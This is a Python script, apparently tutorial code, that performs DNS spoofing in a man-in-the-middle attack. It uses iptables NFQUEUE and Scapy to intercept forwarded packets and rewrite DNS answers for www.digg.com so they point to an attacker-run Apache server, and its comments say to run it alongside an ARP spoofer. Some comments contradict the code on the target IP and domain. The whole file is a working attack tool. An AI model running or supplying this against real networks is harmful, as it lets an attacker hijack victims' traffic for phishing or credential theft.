#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy

# Run python arp_spoof.py in a separate terminal.
# The below command needs to be run in terminal. We can use the subprocess command to run this.
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# ip tables is a program that allows to trap all packets in a queue.
# We need to trap all packets that need to go in the FORWARD chain.
# in a Net Filter Queue and in the queue no 0.
# Also echo 1 > /proc/sys/net/ipv4/ip_forward
# Also, pip install netfilterqueue OR apt-get install build-essential python-dev libnetfilter-queue-dev

def subprocess_calls():
    subprocess.call("iptables --flush", shell = True)
    subprocess.call("service apache2 start", shell = True)
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # FORWARD chain = Forward packets from the victim to router

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())  # Give scapy the payload of the packet. Converted the packet to a scapy packet.

    # Modify the scapy packet.
    if scapy_packet.haslayer(scapy.DNSRR): # if the packet has a layer for DNS Response DNSRR (DNS Query is DNSRQ). We're looking for DND response.
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.digg.com" in qname:
            print("[+] Spoofing Target! ")
            answer = scapy.DNSRR(rrname = qname, rdata = "172.16.61.208") # We have apache server running on Kali machine @ 172.16.61.207 service apache2 start and query name is "www.bing.com" here
            scapy_packet[scapy.DNS].an = answer  # Modify scapy packet to the correct answer.
            scapy_packet[scapy.DNS].ancount = 1 # Modify answer count

            # The packets has length and chcksum field. That might corrupt our created packet. We'll simply delete chcksum and len field for IP and UDP and make scapy calculate it for us.
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet)) # Convert back the scapy_packet to a normal string and then give it back to the actual packet.

    packet.accept() # accept() will simply forward the packet


subprocess_calls()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # connect bind queue to queue that we created earlier in comments above. queue no 0 and callback function.
queue.run()

# At the end, service apache2 stop
# At the end, iptables --flush
